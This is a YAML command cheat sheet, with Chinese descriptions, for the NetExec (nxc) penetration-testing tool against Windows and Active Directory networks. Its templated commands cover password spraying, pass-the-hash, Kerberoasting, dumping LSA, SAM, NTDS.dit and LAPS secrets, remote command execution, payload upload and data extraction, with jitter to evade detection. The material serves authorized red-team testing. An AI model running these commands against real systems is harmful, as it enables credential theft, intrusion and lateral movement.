tool: nxc
tags: [network, windows, active-directory, smb, ldap, authentication, enumeration, exploitation, pentest, red-team]

actions:
  # ============================================================================
  # GETTING STARTED
  # ============================================================================
  
  - title: nxc - 显示帮助和可用协议
    desc: |
      显示通用帮助并列出所有可用协议。显示 SMB、SSH、LDAP、FTP、WMI、WinRM、RDP、VNC、MSSQL 和 NFS 协议。
    command: "nxc --help"

  - title: nxc - 显示协议帮助
    desc: |
      显示特定协议的帮助。展示指定协议的所有可用选项和命令。
    command: "nxc {{protocol|smb}} --help"

  - title: nxc - 设置线程数
    desc: |
      设置扫描的并发线程数。默认为 100。在大规模网络上可增加以加快扫描，为隐蔽性可减少。
    command: "nxc {{protocol|smb}} {{target}} -u {{user}} -p {{pass}} -t {{threads|50}}"

  - title: nxc - 设置超时
    desc: |
      设置每个线程的最大超时时间（秒）。适用于慢速网络或处理无响应的主机时。
    command: "nxc {{protocol|smb}} {{target}} --timeout {{timeout|30}}"

  - title: nxc - 添加抖动/延迟
    desc: |
      在连接之间添加随机延迟以避免检测。格式：单个值或范围（如 2-5）。有助于避免速率限制和检测。
    command: "nxc {{protocol|smb}} {{target}} --jitter {{jitter|3}}"

  - title: nxc - 详细输出
    desc: |
      启用详细输出以获取详细信息。显示更多关于连接、认证尝试和错误的细节。
    command: "nxc {{protocol|smb}} {{target}} --verbose"

  - title: nxc - 调试输出
    desc: |
      启用调试级输出。显示包括底层协议信息在内的最大细节。用于排查问题。
    command: "nxc {{protocol|smb}} {{target}} --debug"

  - title: nxc - 禁用进度条
    desc: |
      禁用进度条显示。将输出重定向到文件或在自动化脚本中运行时很有用。
    command: "nxc {{protocol|smb}} {{target}} --no-progress"

  - title: nxc - 显示版本
    desc: |
      显示 nxc 版本信息。用于检查已安装版本或报告问题。
    command: "nxc --version"

  # Target Formats
  - title: nxc - 扫描单个主机名
    desc: |
      扫描单个主机名。nxc 会自动将主机名解析为 IP 地址。
    command: "nxc {{protocol|smb}} {{hostname|dc01.example.com}}"

  - title: nxc - 扫描单个 IP 地址
    desc: |
      扫描单个 IP 地址。直接 IP 扫描最常用的目标格式。
    command: "nxc {{protocol|smb}} {{ip|192.168.1.100}}"

  - title: nxc - 扫描多个 IP
    desc: |
      扫描以空格分隔的多个 IP 地址。对扫描少量特定目标很高效。
    command: "nxc {{protocol|smb}} {{ip1|192.168.1.100}} {{ip2|192.168.1.101}}"

  - title: nxc - 扫描 CIDR 范围
    desc: |
      使用 CIDR 表示法扫描整个子网。扫描整个网络范围（如 /24 子网）最高效。
    command: "nxc {{protocol|smb}} {{cidr|192.168.1.0/24}}"

  - title: nxc - 扫描 IP 范围
    desc: |
      使用短横线表示法扫描 IP 地址范围。用于无需扫描整个子网即可扫描特定范围。
    command: "nxc {{protocol|smb}} {{range|192.168.1.0-28}}"

  - title: nxc - 从文件扫描
    desc: |
      从文件扫描目标（每行一个目标）。支持主机名、IP、CIDR 和范围。对大型目标列表最高效。
    command: "nxc {{protocol|smb}} {{targets_file|~/targets.txt}}"

  # Credentials
  - title: nxc - 使用用户名和密码认证
    desc: |
      使用用户名和密码认证。所有协议都支持的基本认证方法。包含特殊字符的密码用引号包裹。
    command: "nxc {{protocol|smb}} {{target}} -u {{username}} -p {{password}}"

  - title: nxc - 使用含特殊字符的密码认证
    desc: |
      使用包含特殊字符的密码认证。用单引号包裹以防止 shell 解释问题。
    command: "nxc {{protocol|smb}} {{target}} -u {{username}} -p '{{password|October2022!}}'"

  - title: nxc - 使用 NTLM 哈希认证
    desc: |
      使用 NTLM 哈希而非密码进行认证。适用于 pass-the-hash 攻击。格式：LM:NT 或仅 NT 哈希。
    command: "nxc {{protocol|smb}} {{target}} -u {{username}} -H {{hash}}"

  - title: nxc - 使用哈希文件认证
    desc: |
      使用文件中的哈希进行认证（每行一个哈希）。可对多个目标执行 pass-the-hash 攻击。
    command: "nxc {{protocol|smb}} {{target}} -u {{username}} -H {{hash_file|hashes.txt}}"

  - title: nxc - 使用数据库中的凭据 ID 认证
    desc: |
      通过凭据 ID 使用 nxc 数据库中的凭据。自动从数据库拉取凭据，节省输入。可指定多个 ID。
    command: "nxc {{protocol|smb}} {{target}} -id {{cred_id|1}}"

  - title: nxc - 使用多个凭据 ID 认证
    desc: |
      通过 ID 使用数据库中的多个凭据。对目标测试数据库中的多个凭据集。
    command: "nxc {{protocol|smb}} {{target}} -id {{id1|1}} {{id2|2}}"

  - title: nxc - 多域认证
    desc: |
      在多域环境中认证。文件包含 DOMAIN 与 user 组合格式的用户名，每行一个。
    command: "nxc {{protocol|smb}} {{target}} -u {{domain_users_file}} -p {{password}}"

  # Password Spraying & Brute Forcing
  - title: nxc - 单密码喷洒
    desc: |
      对多个用户名喷洒单个密码。对多个用户测试一个密码。注意账户锁定！
    command: "nxc {{protocol|smb}} {{target}} -u {{user1|user1}} {{user2|user2}} -p {{password|Summer18}}"

  - title: nxc - 从用户名文件喷洒密码
    desc: |
      对文件中的用户名进行密码喷洒。每行一个用户名。对文件中的所有用户测试单个密码。
    command: "nxc {{protocol|smb}} {{target}} -u {{users_file|~/users.txt}} -p {{password|Summer18}}"

  - title: nxc - 暴力破解单个用户
    desc: |
      用多个密码暴力破解单个用户名。对一个用户测试多个密码。可能锁定账户！
    command: "nxc {{protocol|smb}} {{target}} -u {{username}} -p {{pass1|pass1}} {{pass2|pass2}}"

  - title: nxc - 从密码文件暴力破解
    desc: |
      用文件中的密码暴力破解用户名。每行一个密码。对单个用户测试所有密码。
    command: "nxc {{protocol|smb}} {{target}} -u {{username}} -p {{passwords_file|~/passwords.txt}}"

  - title: nxc - 使用用户名和密码文件暴力破解
    desc: |
      同时使用用户名和密码文件暴力破解。测试所有组合。结果：user1=>pass1、user1=>pass2、user2=>pass1 等。非常危险！
    command: "nxc {{protocol|smb}} {{target}} -u {{users_file|~/users.txt}} -p {{passwords_file|~/passwords.txt}}"

  - title: nxc - 不暴力破解的密码喷洒
    desc: |
      不做暴力破解的密码喷洒（1:1 映射）。每个用户与文件中对应的密码匹配。user1=>pass1、user2=>pass2。
    command: "nxc {{protocol|smb}} {{target}} -u {{users_file|~/users.txt}} -p {{passwords_file|~/passwords.txt}} --no-bruteforce"

  - title: nxc - 成功后继续的密码喷洒
    desc: |
      成功登录后继续密码喷洒。适用于对大型用户列表喷洒单个密码。与命令执行不兼容。
    command: "nxc {{protocol|smb}} {{target}} -u {{users_file|~/users.txt}} -p {{password|Summer18}} --continue-on-success"

  - title: nxc - 检查用户名等于密码
    desc: |
      使用相同文件检查用户名是否等于密码。测试用户是否以用户名作为密码。使用 --no-bruteforce 进行 1:1 映射。
    command: "nxc {{protocol|smb}} {{target}} -u {{users_file|~/users.txt}} -p {{users_file|~/users.txt}} --no-bruteforce --continue-on-success"

  - title: nxc - 带抖动的密码喷洒
    desc: |
      带抖动地喷洒密码以限制请求速率。有助于避免账户锁定和检测。抖动按主机生效。
    command: "nxc {{protocol|smb}} {{target}} --jitter {{jitter|3}} -u {{users_file|~/users.txt}} -p {{password|Summer18}}"

  # Kerberos
  - title: nxc - 使用 Kerberos 认证（密码）
    desc: |
      使用密码通过 Kerberos 认证。自动处理 TGT/ST 票据请求。需要有效的域凭据。
    command: "nxc {{protocol|smb}} {{target}} -u {{username}} -p {{password}} -k"

  - title: nxc - 使用 Kerberos 认证（哈希）
    desc: |
      使用 NTLM 哈希通过 Kerberos 认证。自动处理 TGT/ST 票据请求。适用于带 Kerberos 的 pass-the-hash。
    command: "nxc {{protocol|smb}} {{target}} -u {{username}} -H {{hash}} -k"

  - title: nxc - 使用现有 Kerberos 票据
    desc: |
      从 ccache 文件使用现有 Kerberos 票据。将 KRB5CCNAME 环境变量设置为票据文件路径。当你已有有效票据时很有用。
    command: "export KRB5CCNAME={{ticket_file|/path/to/ticket.ccache}} && nxc {{protocol|smb}} {{target}} --use-kcache"

  - title: nxc - 使用 Kerberos 和 kdcHost
    desc: |
      使用显式 KDC 主机的 Kerberos。当域名解析失败或指定自定义 KDC 服务器时需要。
    command: "nxc {{protocol|ldap}} {{target}} -u {{username}} -p {{password}} -k --kdcHost {{kdc_host|dc01.example.com}}"

  # Modules
  - title: nxc - 列出可用模块
    desc: |
      列出协议的所有可用模块。显示模块名称和简要描述。对发现模块功能至关重要。
    command: "nxc {{protocol|smb}} -L"

  - title: nxc - 运行模块
    desc: |
      在目标上执行模块。模块提供凭据转储、横向移动等高级功能。
    command: "nxc {{protocol|smb}} {{target}} -u {{username}} -p {{password}} -M {{module_name|lsassy}}"

  - title: nxc - 显示模块选项
    desc: |
      显示特定模块的选项。展示所有可配置参数及其描述。
    command: "nxc {{protocol|smb}} -M {{module_name|lsassy}} --options"

  - title: nxc - 带选项运行模块
    desc: |
      使用自定义选项执行模块。选项以 KEY=value 格式指定（msfvenom 风格）。多个选项以空格分隔。
    command: "nxc {{protocol|smb}} {{target}} -u {{username}} -p {{password}} -M {{module_name|lsassy}} -o {{option1|KEY1=value1}} {{option2|KEY2=value2}}"

  - title: nxc - 运行多个模块
    desc: |
      顺序执行多个模块。每个模块用 -M 标志指定。对目标运行所有指定的模块。
    command: "nxc {{protocol|smb}} {{target}} -u {{username}} -p {{password}} -M {{module1|spooler}} -M {{module2|iis}} -M {{module3|lsassy}}"

  # Database
  - title: nxc - 访问数据库 Shell
    desc: |
      访问 nxc 数据库 shell（nxcdb）。用于查询和管理已存储凭据、主机、共享等的交互式 shell。
    command: "nxcdb"

  - title: nxc - 创建工作区
    desc: |
      在数据库中创建新工作区。工作区用于分隔不同的测试任务。所有数据按工作区存储。
    command: "nxcdb > workspace create {{workspace_name|test}}"

  - title: nxc - 切换工作区
    desc: |
      切换到不同的工作区。更改所有操作的活动工作区。后续所有 nxc 命令都使用此工作区。
    command: "nxcdb > workspace {{workspace_name|default}}"

  - title: nxc - 列出工作区
    desc: |
      列出所有可用工作区。显示所有已创建的工作区并指示当前活动工作区。
    command: "nxcdb > workspace list"

  - title: nxc - 访问协议数据库
    desc: |
      访问特定协议的数据库。每个协议都有自己的数据库，包含协议特定的命令和数据。
    command: "nxcdb > proto {{protocol|smb}}"

  - title: nxc - 从数据库导出凭据
    desc: |
      将凭据从数据库导出到文件。支持 simple 或 detailed 格式。用于共享或备份。
    command: "nxcdb ({{workspace|default}})({{protocol|smb}}) > export creds {{format|detailed}} {{filename|creds.csv}}"

  - title: nxc - 从数据库导出主机
    desc: |
      将主机从数据库导出到文件。支持 simple、detailed 或 signing 格式。signing 格式只导出启用了 SMB 签名的 IP。
    command: "nxcdb ({{workspace|default}})({{protocol|smb}}) > export hosts {{format|detailed}} {{filename|hosts.csv}}"

  # Logging
  - title: nxc - 记录日志到文件
    desc: |
      将命令输出记录到文件。只记录当前命令的输出。用于保存特定扫描的结果。
    command: "nxc {{protocol|smb}} {{target}} -u {{username}} -p {{password}} --log {{log_file|~/nxc.log}}"

  # DNS Options
  - title: nxc - 设置 DNS 服务器
    desc: |
      手动设置用于名称解析的 DNS 服务器。当默认 DNS 无法正确解析域名时很有用。
    command: "nxc {{protocol|smb}} {{target}} -u {{username}} -p {{password}} --dns-server {{dns_server|8.8.8.8}}"

  - title: nxc - 设置 DNS 超时
    desc: |
      设置 DNS 解析超时时间（秒）。对慢速 DNS 服务器或不可靠网络可增加。
    command: "nxc {{protocol|smb}} {{target}} -u {{username}} -p {{password}} --dns-timeout {{timeout|5}}"

  - title: nxc - 使用 TCP 进行 DNS
    desc: |
      强制使用 TCP 而非 UDP 进行 DNS 解析。当 UDP DNS 被阻止或不可靠时很有用。
    command: "nxc {{protocol|smb}} {{target}} -u {{username}} -p {{password}} --dns-tcp"

  - title: nxc - 强制使用 IPv6
    desc: |
      强制连接使用 IPv6。当目标只有 IPv6 地址或测试 IPv6 连通性时使用。
    command: "nxc {{protocol|smb}} {{target}} -u {{username}} -p {{password}} -6"

  # ============================================================================
  # SMB PROTOCOL
  # ============================================================================

  - title: nxc smb - 基础认证
    desc: |
      使用用户名和密码认证 SMB 共享。检查凭据是否有效。绿色输出 = 成功，红色 = 失败，洋红色 = 密码有效但认证失败。
    command: "nxc smb {{target}} -u {{username}} -p {{password}}"

  - title: nxc smb - 认证域用户
    desc: |
      使用域账户认证。自动从 SMB 连接检测域。成功后显示域和用户名。
    command: "nxc smb {{target}} -u {{domain|DOMAIN}}\\{{username}} -p {{password}}"

  - title: nxc smb - 认证本地用户
    desc: |
      使用本地账户认证。当目标未加入域或测试本地账户时使用。
    command: "nxc smb {{target}} -u {{username}} -p {{password}}"

  - title: nxc smb - 使用哈希认证
    desc: |
      使用 NTLM 哈希认证（pass-the-hash）。格式：LM:NT 或仅 NT 哈希。当你有哈希但没有明文密码时很有用。
    command: "nxc smb {{target}} -u {{username}} -H {{hash|A29F7623FD11550DEF0192DE9246F46B}}"

  - title: nxc smb - 密码喷洒
    desc: |
      对 SMB 目标进行密码喷洒。对多个用户测试单个密码。注意账户锁定！使用 --continue-on-success 可在找到有效凭据后继续。
    command: "nxc smb {{target}} -u {{users_file|~/users.txt}} -p {{password|Summer18}}"

  - title: nxc smb - 执行命令
    desc: |
      通过 SMB 在远程系统上执行命令。需要管理员权限。代码执行成功时显示（Pwn3d!）。很可能是本地管理员。
    command: "nxc smb {{target}} -u {{username}} -p {{password}} -x {{command|whoami}}"

  - title: nxc smb - 执行 PowerShell 命令
    desc: |
      在远程系统上执行 PowerShell 命令。使用 -X 标志和 PowerShell 命令。用于高级 Windows 管理。
    command: "nxc smb {{target}} -u {{username}} -p {{password}} -X '{{ps_command|Get-Process}}'"

  - title: nxc smb - 从远程获取文件
    desc: |
      从远程 SMB 共享下载文件。将文件从远程路径下载到本地路径。用于从已攻陷系统提取文件。
    command: "nxc smb {{target}} -u {{username}} -p {{password}} --get-file {{remote_path|\\Windows\\Temp\\file.txt}} {{local_path|/tmp/file.txt}}"

  - title: nxc smb - 上传文件到远程
    desc: |
      将文件上传到远程 SMB 共享。将本地文件上传到远程路径。用于向已攻陷系统传输工具或 payload。
    command: "nxc smb {{target}} -u {{username}} -p {{password}} --put-file {{local_path|/tmp/file.txt}} {{remote_path|\\Windows\\Temp\\file.txt}}"

  - title: nxc smb - 枚举共享
    desc: |
      枚举 SMB 共享和访问权限。列出所有可用共享并显示当前凭据可访问哪些。
    command: "nxc smb {{target}} -u {{username}} -p {{password}} --shares"

  - title: nxc smb - 爬取共享
    desc: |
      递归爬取 SMB 共享以查找文件。发现可访问共享中的文件和文件夹。用于查找敏感数据。
    command: "nxc smb {{target}} -u {{username}} -p {{password}} --spider {{share|C$}} --spider-folder {{folder|Users}}"

  - title: nxc smb - 枚举域用户
    desc: |
      通过 SMB 枚举域用户。列出域中的所有用户。需要域凭据。
    command: "nxc smb {{target}} -u {{username}} -p {{password}} --users"

  - title: nxc smb - 枚举域组
    desc: |
      通过 SMB 枚举域组。列出域中的所有组及其成员。需要域凭据。
    command: "nxc smb {{target}} -u {{username}} -p {{password}} --groups"

  - title: nxc smb - 枚举已登录用户
    desc: |
      枚举当前登录到目标系统的用户。显示活动用户会话。用于识别高价值目标。
    command: "nxc smb {{target}} -u {{username}} -p {{password}} --loggedon-users"

  - title: nxc smb - 枚举本地组
    desc: |
      枚举目标系统上的本地组。显示本地组成员。用于权限提升评估。
    command: "nxc smb {{target}} -u {{username}} -p {{password}} --local-groups"

  - title: nxc smb - 枚举会话
    desc: |
      枚举活动 SMB 会话。显示谁连接到 SMB 共享。用于识别活动用户。
    command: "nxc smb {{target}} -u {{username}} -p {{password}} --sessions"

  - title: nxc smb - 枚举磁盘
    desc: |
      枚举远程系统上的磁盘驱动器。显示可用磁盘卷及其大小。用于侦察。
    command: "nxc smb {{target}} -u {{username}} -p {{password}} --disks"

  - title: nxc smb - 检查 SMB 签名
    desc: |
      检查是否需要 SMB 签名。显示每个主机的签名状态。未签名的 SMB 允许中继攻击。
    command: "nxc smb {{target}} --gen-relay-list {{output_file|targets.txt}}"

  - title: nxc smb - 扫描漏洞
    desc: |
      扫描 SMB 目标的已知漏洞。检查常见的 SMB 漏洞和错误配置。
    command: "nxc smb {{target}} -u {{username}} -p {{password}} --vulns"

  - title: nxc smb - 转储 LSA 机密
    desc: |
      从远程系统转储 LSA 机密。提取缓存的凭据、服务账户密码等。需要管理员权限。
    command: "nxc smb {{target}} -u {{username}} -p {{password}} -M lsassy"

  - title: nxc smb - 转储 SAM 数据库
    desc: |
      从远程系统转储 SAM 数据库。提取本地账户密码哈希。需要 SYSTEM 权限。
    command: "nxc smb {{target}} -u {{username}} -p {{password}} -M sam"

  - title: nxc smb - 转储 DPAPI 机密
    desc: |
      从远程系统转储 DPAPI 机密。提取 Windows 应用存储的加密凭据。需要用户上下文。
    command: "nxc smb {{target}} -u {{username}} -p {{password}} -M dpapi"

  - title: nxc smb - 转储 NTDS.dit
    desc: |
      从域控转储 NTDS.dit。提取所有域账户哈希。需要域管理员权限和访问域控。
    command: "nxc smb {{target}} -u {{username}} -p {{password}} -M ntds"

  - title: nxc smb - 检查空会话
    desc: |
      检查空会话访问。测试是否允许匿名/空会话。用于无凭据枚举。
    command: "nxc smb {{target}} -u '' -p ''"

  - title: nxc smb - 生成 hosts 文件
    desc: |
      从发现的系统生成 hosts 文件。创建主机名到 IP 映射的 /etc/hosts 格式文件。
    command: "nxc smb {{target}} -u {{username}} -p {{password}} --gen-hosts-file {{output_file|hosts.txt}}"

  - title: nxc smb - 生成 krb5.conf
    desc: |
      为 Kerberos 生成 krb5.conf 文件。创建包含域信息的 Kerberos 配置文件。
    command: "nxc smb {{target}} -u {{username}} -p {{password}} --gen-krb5-conf {{output_file|krb5.conf}}"

  - title: nxc smb - 生成 TGT
    desc: |
      生成 Kerberos TGT 票据。从 KDC 请求 TGT 并保存到 ccache 文件。需要有效的域凭据。
    command: "nxc smb {{target}} -u {{username}} -p {{password}} --gen-tgt {{output_file|ticket.ccache}}"

  - title: nxc smb - 更改用户密码
    desc: |
      在远程系统上更改用户密码。需要适当的权限来更改目标用户的密码。
    command: "nxc smb {{target}} -u {{username}} -p {{password}} --change-password {{target_user}} {{new_password}}"

  - title: nxc smb - 冒充已登录用户
    desc: |
      冒充当前已登录的用户。从已登录用户窃取令牌以提升权限。
    command: "nxc smb {{target}} -u {{username}} -p {{password}} -M impersonate"

  - title: nxc smb - 检查 Print Spooler
    desc: |
      检查 Print Spooler 服务是否在运行。Print Spooler 可被滥用于权限提升（CVE-2021-1675）。
    command: "nxc smb {{target}} -u {{username}} -p {{password}} -M spooler"

  - title: nxc smb - 检查 WebDAV
    desc: |
      检查 WebDAV 是否运行且可访问。WebDAV 可用于文件操作和潜在利用。
    command: "nxc smb {{target}} -u {{username}} -p {{password}} -M webdav"

  - title: nxc smb - 突破 LAPS
    desc: |
      提取 LAPS（本地管理员密码解决方案）密码。从域中获取托管的本地管理员密码。
    command: "nxc smb {{target}} -u {{username}} -p {{password}} -M laps"

  # ============================================================================
  # LDAP PROTOCOL
  # ============================================================================

  - title: nxc ldap - 基础认证
    desc: |
      使用用户名和密码认证 LDAP。测试 LDAP 凭据。成功后显示域信息。
    command: "nxc ldap {{target}} -u {{username}} -p {{password}}"

  - title: nxc ldap - 使用哈希认证
    desc: |
      使用 NTLM 哈希认证 LDAP。LDAP 协议的 pass-the-hash 认证。
    command: "nxc ldap {{target}} -u {{username}} -H {{hash|A29F7623FD11550DEF0192DE9246F46B}}"

  - title: nxc ldap - 不使用 SMB 认证
    desc: |
      无需初始 SMB 连接即可认证 LDAP。当 SMB 端口关闭或你想跳过 SMB 连接时使用 --no-smb。
    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --no-smb"

  - title: nxc ldap - 枚举用户
    desc: |
      通过 LDAP 枚举域中的所有用户。列出所有域用户及其属性。需要域凭据。
    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --users"

  - title: nxc ldap - 枚举活动用户
    desc: |
      只枚举域中活动（已启用）的用户。过滤掉已禁用账户。比完整用户枚举更高效。
    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --active-users"

  - title: nxc ldap - 导出用户到文件
    desc: |
      枚举用户并导出到文件。将用户列表保存到指定文件以供进一步处理或分析。
    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --users-export {{output_file|users.txt}}"

  - title: nxc ldap - 枚举组成员
    desc: |
      枚举特定组的成员。列出指定域组中的所有用户。用于查找特权组成员。
    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --group-members {{group_name|Domain Admins}}"

  - title: nxc ldap - 枚举信任
    desc: |
      枚举域信任。列出与其他域的所有信任关系。用于跨域攻击规划。
    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --trusts"

  - title: nxc ldap - 枚举域控
    desc: |
      枚举域控。列出域中所有域控及其 IP 地址和主机名。
    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --dc-list"

  - title: nxc ldap - 查找域 SID
    desc: |
      查找域 SID（安全标识符）。获取各种攻击和枚举所需的域 SID。
    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --domain-sid"

  - title: nxc ldap - ASREPRoast 攻击
    desc: |
      执行 ASREPRoast 攻击。为无 Kerberos 预认证的用户获取 AS-REP 哈希。无需凭据即可完成。
    command: "nxc ldap {{target}} -u {{username|''}} -p {{password|''}} --asreproast {{output_file|asrep.txt}}"

  - title: nxc ldap - 带用户列表的 ASREPRoast
    desc: |
      带用户列表的 ASREPRoast 攻击。测试多个用户寻找可 AS-REP roast 的账户。无需认证。
    command: "nxc ldap {{target}} -u {{users_file|~/users.txt}} -p '' --asreproast {{output_file|asrep.txt}}"

  - title: nxc ldap - 带认证的 ASREPRoast
    desc: |
      使用有效凭据的 ASREPRoast 攻击。枚举所有用户并寻找可 AS-REP roast 的账户。比未认证版本更全面。
    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --asreproast {{output_file|asrep.txt}}"

  - title: nxc ldap - Kerberoasting 攻击
    desc: |
      执行 Kerberoasting 攻击。获取服务账户的 TGS-REP 哈希。需要域账户或可 AS-REP roast 的账户。
    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --kerberoasting {{output_file|kerberoast.txt}}"

  - title: nxc ldap - 通过 AS-REP 进行 Kerberoasting
    desc: |
      使用可 AS-REP roast 的账户进行 Kerberoasting。结合 --no-preauth-targets 和 --kerberoasting 在无预认证的情况下执行 Kerberoasting。
    command: "nxc ldap {{target}} -u {{asrep_user}} -p '' --no-preauth-targets {{targets_file|kerberoastable.list}} --kerberoasting {{output_file|kerberoast.txt}}"

  - title: nxc ldap - 检查 LDAP 签名
    desc: |
      检查是否需要 LDAP 签名。未签名的 LDAP 允许中继攻击。显示域控的签名状态。
    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --ldap-signing"

  - title: nxc ldap - 查找非约束委派
    desc: |
      查找具有非约束委派的账户。这些账户可被滥用于权限提升和凭据窃取。
    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --unconstrained-delegation"

  - title: nxc ldap - 查找配置错误的委派
    desc: |
      查找约束委派配置错误的账户。约束委派错误配置可被利用进行权限提升。
    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --find-delegation"

  - title: nxc ldap - 枚举 admin count
    desc: |
      枚举 adminCount=1 的用户。这些用户具有特权访问，是高价值目标。
    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --admin-count"

  - title: nxc ldap - 转储 GMSA 账户
    desc: |
      转储组托管服务账户（GMSA）信息。GMSA 账户有可被提取的托管密码。
    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --gmsa"

  - title: nxc ldap - 提取 GMSA 机密
    desc: |
      提取 GMSA 账户机密。获取可用于认证的 GMSA 账户密码哈希。
    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --gmsa-secrets"

  - title: nxc ldap - 枚举机器账户配额
    desc: |
      检查机器账户配额。显示用户可以创建多少个计算机账户。用于域持久化。
    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --maq"

  - title: nxc ldap - 读取 DACL 权限
    desc: |
      读取 DACL（自主访问控制列表）权限。显示对象上可能允许权限提升的权限。
    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --dacl"

  - title: nxc ldap - 获取用户描述
    desc: |
      从 LDAP 获取用户描述。用户描述有时包含密码或其他敏感信息。
    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --user-descriptions"

  - title: nxc ldap - 提取子网信息
    desc: |
      从 AD 提取子网信息。列出 Active Directory 站点和服务中定义的所有子网。
    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --subnets"

  - title: nxc ldap - 枚举 SCCM
    desc: |
      枚举 SCCM（System Center Configuration Manager）信息。SCCM 可被滥用于横向移动和代码执行。
    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --sccm"

  - title: nxc ldap - 枚举 Entra ID
    desc: |
      枚举 Entra ID（Azure AD）信息。显示 Entra ID 配置和混合设置信息。
    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --entra-id"

  - title: nxc ldap - 查询 LDAP
    desc: |
      执行自定义 LDAP 查询。允许运行任意 LDAP 查询进行高级枚举和数据提取。
    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --query {{ldap_query|(objectClass=user)}}"

  - title: nxc ldap - BloodHound 采集器
    desc: |
      运行 BloodHound 采集器收集 AD 数据。生成与 BloodHound 兼容的数据文件用于图分析。
    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --bloodhound"

  - title: nxc ldap - 利用 ESC8（ADCS）
    desc: |
      利用 Active Directory 证书服务中的 ESC8 漏洞。允许通过证书滥用进行域权限提升。
    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --esc8"

  - title: nxc ldap - 提升子域
    desc: |
      提升子域的功能级别。需要域管理员权限的高级域操作。
    command: "nxc ldap {{target}} -u {{username}} -p {{password}} --raise-child"

  # ============================================================================
  # MSSQL PROTOCOL
  # ============================================================================

  - title: nxc mssql - Windows 认证
    desc: |
      使用 Windows 认证认证 MSSQL。默认认证方法。使用当前用户的 Windows 凭据或指定的域账户。
    command: "nxc mssql {{target}} -u {{username}} -p {{password}}"

  - title: nxc mssql - 带域的 Windows 认证
    desc: |
      当 SMB 端口关闭时使用 Windows 认证认证 MSSQL。用 -d 标志显式指定域以避免 SMB 连接。
    command: "nxc mssql {{target}} -u {{username}} -p {{password}} -d {{domain|DOMAIN}}"

  - title: nxc mssql - 本地认证
    desc: |
      使用 SQL Server 认证（本地认证）认证 MSSQL。使用 --local-auth 标志进行 SQL 登录而非 Windows 登录。
    command: "nxc mssql {{target}} -u {{username}} -p {{password}} --local-auth"

  - title: nxc mssql - 指定自定义端口
    desc: |
      在自定义端口上连接 MSSQL。默认为 1433。非标准端口使用 --port。
    command: "nxc mssql {{target}} -u {{username}} -p {{password}} --port {{port|1434}}"

  - title: nxc mssql - 执行 SQL 查询
    desc: |
      在 MSSQL 服务器上执行 SQL 查询。运行指定的 SQL 命令并显示结果。需要适当的数据库权限。
    command: "nxc mssql {{target}} -u {{username}} -p {{password}} -q '{{sql_query|SELECT name FROM master.dbo.sysdatabases;}}'"

  - title: nxc mssql - 执行 Windows 命令
    desc: |
      通过 MSSQL xp_cmdshell 执行 Windows 命令。需要启用 xp_cmdshell 并有适当权限。成功后显示（Pwn3d!）。
    command: "nxc mssql {{target}} -u {{username}} -p {{password}} -x {{command|whoami}}"

  - title: nxc mssql - 密码喷洒
    desc: |
      对 MSSQL 服务器进行密码喷洒。对多个 MSSQL 实例测试凭据。使用 --no-bruteforce 进行 1:1 用户:密码映射。
    command: "nxc mssql {{target}} -u {{users_file|~/users.txt}} -p {{password|Summer18}}"

  - title: nxc mssql - 通过 RID 枚举用户
    desc: |
      通过暴力破解 RID 枚举用户。通过尝试不同的 RID 值将 SID 解析为用户名。用于用户枚举。
    command: "nxc mssql {{target}} -u {{username}} -p {{password}} --rid-brute"

  - title: nxc mssql - 权限提升
    desc: |
      尝试 MSSQL 权限提升。通过各种 MSSQL 错误配置和漏洞尝试提升权限。
    command: "nxc mssql {{target}} -u {{username}} -p {{password}} --privesc"

  - title: nxc mssql - 上传文件
    desc: |
      将文件上传到 MSSQL 服务器。通过 MSSQL 将本地文件传输到远程系统。用于传输工具或 payload。
    command: "nxc mssql {{target}} -u {{username}} -p {{password}} --put-file {{local_file|/tmp/file.txt}} {{remote_path|C:\\temp\\file.txt}}"

  - title: nxc mssql - 下载文件
    desc: |
      从 MSSQL 服务器下载文件。通过 MSSQL 将远程文件获取到本地系统。用于数据窃取。
    command: "nxc mssql {{target}} -u {{username}} -p {{password}} --get-file {{remote_path|C:\\temp\\file.txt}} {{local_file|/tmp/file.txt}}"

  # ============================================================================
  # SSH PROTOCOL
  # ============================================================================

  - title: nxc ssh - 基础认证
    desc: |
      使用用户名和密码认证 SSH 服务器。测试 SSH 凭据。显示 SSH 版本和认证结果。
    command: "nxc ssh {{target}} -u {{username}} -p {{password}}"

  - title: nxc ssh - 指定自定义端口
    desc: |
      在自定义端口上连接 SSH。默认为 22。非标准 SSH 端口使用 --port。
    command: "nxc ssh {{target}} --port {{port|2222}}"

  - title: nxc ssh - 执行命令
    desc: |
      通过 SSH 在远程系统上执行命令。运行命令并显示输出。获得 root 访问时显示（Pwn3d!）。
    command: "nxc ssh {{target}} -u {{username}} -p {{password}} -x {{command|whoami}}"

  - title: nxc ssh - 密码喷洒
    desc: |
      对 SSH 服务器进行密码喷洒。对多个 SSH 主机测试凭据。注意账户锁定！
    command: "nxc ssh {{target}} -u {{users_file|~/users.txt}} -p {{password|Summer18}}"

  - title: nxc ssh - 从远程获取文件
    desc: |
      通过 SCP 从远程系统下载文件。使用 SSH/SCP 将文件从远程传输到本地系统。
    command: "nxc ssh {{target}} -u {{username}} -p {{password}} --get-file {{remote_path|/tmp/file.txt}} {{local_path|/tmp/file.txt}}"

